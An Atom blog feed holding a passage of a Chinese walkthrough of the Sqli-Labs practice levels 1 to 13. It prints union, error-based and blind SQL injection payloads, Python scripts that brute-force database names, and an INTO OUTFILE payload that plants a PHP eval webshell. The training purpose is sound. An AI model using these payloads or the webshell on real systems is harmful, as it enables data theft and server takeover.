<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Gard3nia&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://gardenia30.top/"/>
  <updated>2019-04-09T09:29:50.493Z</updated>
  <id>https://gardenia30.top/</id>
  
  <author>
    <name>Gard3nia</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Sqli-Labs通关笔记-basic</title>
    <link href="https://gardenia30.top/2019/04/03/Sqli-Labs%E7%AC%94%E8%AE%B0-basic/"/>
    <id>https://gardenia30.top/2019/04/03/Sqli-Labs笔记-basic/</id>
    <published>2019-04-03T03:36:53.000Z</published>
    <updated>2019-04-09T09:29:50.493Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Sqli-labs初体验~<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p> 是一个简答的字符型注入，GET传参<code>id=1‘</code>，发现报错：</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL<br>server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p></blockquote><p>既然报错了就很简单了，直接注释掉后面的引号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27--+</span><br></pre></td></tr></table></figure><p>回显正常，说明确实是字符型注入，接下来就是用<code>order by</code>查询当前表有几个字段；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27 order by 3--+</span><br></pre></td></tr></table></figure><p>到3列为止没有任何问题，到4为止就报错：</p><blockquote><p>Unknown column ‘4’ in ‘order clause’</p></blockquote><p>说明只有3列，那就可以直接用<code>union select</code>进行查询了，这里需要将union select前面的查询语句置空，这样的话，查询的结果就都是union select之后的查询内容了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,3--+</span><br></pre></td></tr></table></figure><p>这里的回显结果为2和3，这样的话我们可以直接利用这两个位置进行回显自己想要的数据，得到数据库名和数据库用户名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,database(),user()--+</span><br></pre></td></tr></table></figure><blockquote><p>Your Login name:security<br>Your Password:root@localhost</p></blockquote><p>接下来就是使用系统数据库的一些表单进行更深入的查询了，一般的顺序就是：<code>爆库-&gt;爆表-&gt;爆列-&gt;爆数据</code>；其实到上述为止已经爆库了；</p><p>接下来是用系统数据库进行查询的一系列步骤：</p><ol><li><p>爆库名（此处爆的是mysql中所有的数据库，而database()只能做到查询到当前库的名字）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure><blockquote><p>Your Login name:information_schema,challenges,mysql,performance_schema,security<br>Your Password:3</p></blockquote></li><li><p>爆表名（information_schema数据库里的tables表里的table_name和table_schema列）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos;--+</span><br></pre></td></tr></table></figure><blockquote><p>Your Login name:emails,referers,uagents,users<br>Your Password:3</p></blockquote></li><li><p>爆列名（information_schema数据库里的columns表里的column列）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure><blockquote><p>Your Login name:id,username,password<br>Your Password:3</p></blockquote></li><li><p>爆数值（知道了所有的信息：库名，表名，列名，列出合格的查询语句即可）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure><blockquote><p>name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4<br>Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</p></blockquote></li></ol><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>尝试<code>?id=1‘</code>，<code>?id=1&#39;--+</code>发现全都报错，猜测是数字型注入；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>发现确实是数字型注入，然后重复less-1的操作即可；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select 1,2,3--+</span><br></pre></td></tr></table></figure><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>尝试<code>?id=1&#39;</code>，<code>?id=1&#39;--+</code>都报错</p><blockquote><p>You have an error in your SQL syntax; check the<br>manual that corresponds to your MySQL server version for the right<br>syntax to use near ‘’1’’) LIMIT 0,1’ at line 1</p></blockquote><p>尝试<code>?id=1&#39;)--+</code>成功回显，查看源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>果然是需要闭合一个引号和括号，接下来就是和less-1一样的操作；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&apos;) union select 1,2,3--+</span><br></pre></td></tr></table></figure><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>查看源代码，在$id左右加上双引号和括号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = &apos;&quot;&apos; . $id . &apos;&quot;&apos;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure><h2 id="小结1"><a href="#小结1" class="headerlink" title="小结1"></a>小结1</h2><p>这部分的注入非常基础和简单，只要熟悉<code>mysql</code>中的<code>information_schema</code>数据库，善于利用<code>order by</code>去查询列数，然后直接用<code>information_schema</code>数据库里的数据表去结合<code>union select</code>查询就好；</p><h2 id="less-5-盲注-单引号"><a href="#less-5-盲注-单引号" class="headerlink" title="less-5(盲注-单引号)"></a>less-5(盲注-单引号)</h2><p>从这里开始就需要使用到sql盲注的知识了，先介绍几个需要用到的常用的函数：</p><blockquote><p>left(a,b) //从左开始截取a的前b位</p><p>ascii() //将单个字符转换为ASCII码</p><p>substr(str,pos,len) //将str字符串截断，从pos位开始取len个字符（开始为1）</p><p>length() //返回字符串的长度</p><p>sleep(n) //将程序挂起一段时间，n为n秒</p><p>if(a,b,c) //如果a=true，则执行b，否则执行c</p></blockquote><p>这里输入<code>?id=1&#39;</code>发现报错，直接注释掉后面的语句<code>?id=1&#39;--+</code>，回显<code>You are in...........</code>；由此得到此题为盲注的类型，直接查询肯定是看不到的，但是可以判断输入的查询语句的结果是否为真，这样的话就可以使用盲注的思路来解决此题：</p><h3 id="solution1-构造逻辑判断"><a href="#solution1-构造逻辑判断" class="headerlink" title="solution1(构造逻辑判断)"></a>solution1(构造逻辑判断)</h3><p>先测试数据库的名字（此处省去二分查找的过程）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure><p>回显：<code>You are in...........</code>所以数据库的名字的第一个字母为s，接下来再次测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr(database(),2,1))=101--+</span><br></pre></td></tr></table></figure><p>得到数据库名字的第二个字母为e，所以接下来就按照这种方法去测试下面的几个字母就可以很容易的得到数据库的名字，这里就不一一去尝试了，贴上爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://127.0.0.1/sqli-labs/sqli-labs-master/Less-5/?id=1' and ascii(substr(database(),&#123;len&#125;,1))=&#123;ascii&#125;--+"</span></span><br><span class="line">database_name=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">url_now=url.format(len=i,ascii=j)</span><br><span class="line">r=requests.get(url_now)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">database_name+=chr(j)</span><br><span class="line"><span class="keyword">print</span> database_name</span><br></pre></td></tr></table></figure><p>得到库名：security，用此方法即可推出表名和列名，只是暴力破解需要时间，慢慢爆破是肯定可以的,给出<strong>payload：</strong><code>?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101--+</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://127.0.0.1/sqli-labs/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),&#123;len&#125;,1))=&#123;ascii&#125; --+"</span></span><br><span class="line">table_name=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">url_now=url.format(len=i,ascii=j)</span><br><span class="line">r=requests.get(url_now)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">table_name+=chr(j)</span><br><span class="line"><span class="keyword">print</span> table_name</span><br></pre></td></tr></table></figure><p>爆破出表名：</p><p><img src="https://s2.ax1x.com/2019/03/07/kxfRDU.png" alt="kxfRDU.png"></p><p>总的来说，这个方法的主要思路就是：在构造数据库查询语句结果为true和false的时候回显页面不一样，这样的话就可以通过构造逻辑判断的方法来一个个猜测字段的名称，从而达到获取敏感信息的目的；</p><h3 id="solution2-concat函数报错注入"><a href="#solution2-concat函数报错注入" class="headerlink" title="solution2(concat函数报错注入)"></a>solution2(concat函数报错注入)</h3><p>基于concat报错的注入时，利用的是MySQL的一个bug，rand()值不固定，需要多试几次(固定格式，换掉检索内容即可，报错内容和原因有待研究…)</p><p>爆库payload1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1%27%20union%20select%201,count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure><p>得到本数据库名称：</p><blockquote><p>Duplicate entry ‘::security::1’ for key ‘group_key’</p></blockquote><p>爆表payload2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 3,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p>得到关键数据表名称：</p><blockquote><p>Duplicate entry ‘::users::0’ for key ‘group_key’</p></blockquote><p>爆列payload3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 2,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p>得到关键列名：</p><blockquote><p>Duplicate entry ‘::username::0’ for key ‘group_key’</p><p>Duplicate entry ‘::password::0’ for key ‘group_key’</p></blockquote><p>爆数据payload4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select username from users limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select password from users limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure><p>只能通过控制limit的数值查看不同的行数，不可以用group_concat，得到结果：</p><blockquote><p>Duplicate entry ‘::Angelina::1’ for key ‘group_key’</p><p>Duplicate entry ‘::I-kill-you::0’ for key ‘group_key’</p></blockquote><h3 id="solution3-xpath函数报错注入"><a href="#solution3-xpath函数报错注入" class="headerlink" title="solution3(xpath函数报错注入)"></a>solution3(xpath函数报错注入)</h3><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><p>爆库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select database() limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>爆表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>爆列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns  where table_name=&apos;users&apos; limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>爆值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select username from users limit 2,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select password from users limit 2,1),0x7e),1)--+</span><br></pre></td></tr></table></figure><p>得到关键信息：</p><blockquote><p>XPATH syntax error: ‘~Dummy~’</p><p>XPATH syntax error: ‘~p@ssword~’</p></blockquote><p>调整limit参数即可查询不同的行信息；</p><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><p>和updatexml一样，继续注入即可，不再赘述……</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(payload),0x7e))--+</span><br></pre></td></tr></table></figure><h3 id="solution4-bigint溢出报错注入"><a href="#solution4-bigint溢出报错注入" class="headerlink" title="solution4(bigint溢出报错注入)"></a>solution4(bigint溢出报错注入)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (!(select * from (select user())x) - ~0),2,3--+</span><br></pre></td></tr></table></figure><p>暂未成功，待更……</p><h3 id="soultion5-double类型溢出报错"><a href="#soultion5-double类型溢出报错" class="headerlink" title="soultion5(double类型溢出报错)"></a>soultion5(double类型溢出报错)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (exp(~(select * FROM(SELECT USER())a))),2,3--+</span><br></pre></td></tr></table></figure><p>暂未成功，待更……</p><h3 id="solution6-利用数据的重复性报错"><a href="#solution6-利用数据的重复性报错" class="headerlink" title="solution6(利用数据的重复性报错)"></a>solution6(利用数据的重复性报错)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+</span><br></pre></td></tr></table></figure><p>暂未成功，只能注出mysql版本，待更……</p><h3 id="solution7-延时注入"><a href="#solution7-延时注入" class="headerlink" title="solution7(延时注入)"></a>solution7(延时注入)</h3><p>如果第一个判断为true，则立即返回，若为flase，则会有5秒的延时，后面基本就和solution1一致，不再赘述；给出payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</span><br></pre></td></tr></table></figure><h2 id="less-6-盲注-双引号"><a href="#less-6-盲注-双引号" class="headerlink" title="less-6(盲注-双引号)"></a>less-6(盲注-双引号)</h2><p>除了是双引号闭合，其他和less-5一样，不再赘述……</p><h2 id="less-7-文件导入导出"><a href="#less-7-文件导入导出" class="headerlink" title="less-7(文件导入导出)"></a>less-7(文件导入导出)</h2><p>尝试<code>id=1&#39;</code>报错，<code>id=1&#39;--+</code>依然报错，<code>id=1&quot;</code>不报错，那方向还是在单引号上，查看源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>发现可以构造<code>id=1&#39;))</code>进行闭合，这里有一个小技巧，就是如何判断是否需要闭合括号，尝试<code>id=1&#39; and 1=1--+</code>，注释以后任然报错，说明是有括号的，逐个加括号测试即可；</p><p>然后就是进行数据库导出文件，尝试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) union select * from users into outfile &quot;D:\\1.txt&quot;--+</span><br></pre></td></tr></table></figure><p>发现mysql报错，指定路径下也没有该文件，可能原因如下：</p><h3 id="First"><a href="#First" class="headerlink" title="First"></a>First</h3><p>猜想：可能是权限不够，需要root权限才可以对数据库进行读写，用以下语句测试权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) and (select count(*) from mysql.user)&gt;0--+</span><br></pre></td></tr></table></figure><p>回显正常，说明不是权限不够的问题；</p><h3 id="Second"><a href="#Second" class="headerlink" title="Second"></a>Second</h3><p>猜想：可能是需要在指定的目录下进行数据的导出操作，<code>secure_file_priv</code>这个参数用来限制数据导入和导出操作的效果，先查看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%secure%&apos;;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/08/kzznaj.png" alt="kzznaj.png"></p><p>结果为NULL， </p><blockquote><p>1.如果这个参数为空，这个变量没有效果；<br>2.如果这个参数设为一个目录名，Mysql服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它；<br>3.如果这个参数为<code>null</code>，Mysql服务会禁止导入和导出操作；</p></blockquote><p>在MYSQL配置文件my.ini添加<code>secure_file_priv=</code>，再次查看得到结果不为NULL，因为没有设置指定的目录，所以任意目录都可以进行导入和导出；</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><h4 id="1-写入木马"><a href="#1-写入木马" class="headerlink" title="1.写入木马"></a>1.写入木马</h4><p>直接使用outfile的写文件功能向指定文件夹上传木马，连接菜刀即可；</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) union select 1,2,&apos;&lt;?php @eval($_POST[cmd]);?&gt;&apos; into outfile &apos;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\1.php&apos; --+</span><br></pre></td></tr></table></figure><h4 id="2-导出文件"><a href="#2-导出文件" class="headerlink" title="2. 导出文件"></a>2. 导出文件</h4><p>直接将users表单内容导出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;)) union select * from users into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs\\sqli-labs-master\\Less-7\\2.txt&quot;--+</span><br></pre></td></tr></table></figure><h2 id="less-8-bool盲注"><a href="#less-8-bool盲注" class="headerlink" title="less-8(bool盲注)"></a>less-8(bool盲注)</h2><p>其实和第5关相比就是注释掉了<code>print_r(mysql_error())</code>，是个bool盲注，只是不可以使用报错注入而已；</p><p><img src="https://s2.ax1x.com/2019/03/12/AiG7o6.png" alt="AiG7o6.png"></p><p>所以直接构造逻辑判断盲注即可：</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27%20and%20ascii(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure><h2 id="less-9-时间盲注-单引号"><a href="#less-9-时间盲注-单引号" class="headerlink" title="less-9(时间盲注-单引号)"></a>less-9(时间盲注-单引号)</h2><p>这一关和前面的第8关的区别就是没有回显，是一个时间盲注，直接闭合引号后时间盲注即可；</p><p>payload:</p><p>1.爆库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr((database()),1,1))=115,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>2.爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=105,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>3.爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1))=105,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>4.爆数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr((select password from users limit 0,1),1,1))=68,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>其实就是一个暴力破解的过程(二分法提高效率)</p><h2 id="less-10-时间盲注-双引号"><a href="#less-10-时间盲注-双引号" class="headerlink" title="less-10(时间盲注-双引号)"></a>less-10(时间盲注-双引号)</h2><p>测试单引号<code>?id=1&#39; and sleep(5)--+</code>没有延时，说明不是单引号，试一下双引号即可；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and sleep(5)--+</span><br></pre></td></tr></table></figure><p>接下来除了双引号，和less-9一样；</p><h2 id="小结2"><a href="#小结2" class="headerlink" title="小结2"></a>小结2</h2><h2 id="less-11-Post注入"><a href="#less-11-Post注入" class="headerlink" title="less-11(Post注入)"></a>less-11(Post注入)</h2><p>无从下手就查看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>这里的uname和passwd都是通过post请求传入的，这里我们需要使用到bp截包修改传递参数的内容；首先闭合引号后，构造永真语句查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; or 1=1--+</span><br></pre></td></tr></table></figure><blockquote><p>Your Login name:Dumb<br>Your Password:Dumb</p></blockquote><p>成功回显，所以直接就可以查询列数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; order by 2--+</span><br></pre></td></tr></table></figure><p>发现是有两列的，然后继续构造union select查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select 1,2--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/13/AFR0JO.png" alt="AFR0JO.png"></p><p>发现可以查询到1,2列的东西，那就可以利用这两个位置来回显想要的东西了；构造如下语句：</p><p>1.爆库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select database(),version()--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/13/AFRRTP.png" alt="AFRRTP.png"></p><p>2.爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/13/AFWl7t.png" alt="AFWl7t.png"></p><p>3.爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select database(),group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/13/AFWUXj.png" alt="AFWUXj.png"></p><p>4.爆数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; union select group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/13/AFWgc4.png" alt="AFWgc4.png"></p><p>其实无非就是传参方式变了而已，友情提示：新版hackbar是坑，谨慎使用；</p><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>其实和上一题类似，只是闭合方式变了而已，需要用到双引号加小括号闭合，payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&quot;) or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p>尝试单引号失败，双引号失败，发现应该没有那么简单，直接查看源码发现如下内容：</p><p>1.闭合方式是<code>&#39;)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql=&quot;SELECT username, password FROM users WHERE username=(&apos;$uname&apos;) and password=(&apos;$passwd&apos;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>2.不会返回SQL查询语句的内容</p><p><img src="https://s2.ax1x.com/2019/03/13/AFfqiV.png" alt="AFfqiV.png"></p><p>3.发现针对查询结果对错的返回页面的图片不一样</p><p>正确：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&apos;;</span><br></pre></td></tr></table></figure><p>错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&apos;;</span><br></pre></td></tr></table></figure><p>这里演示2种方法：</p><h3 id="solution1-concat报错"><a href="#solution1-concat报错" class="headerlink" 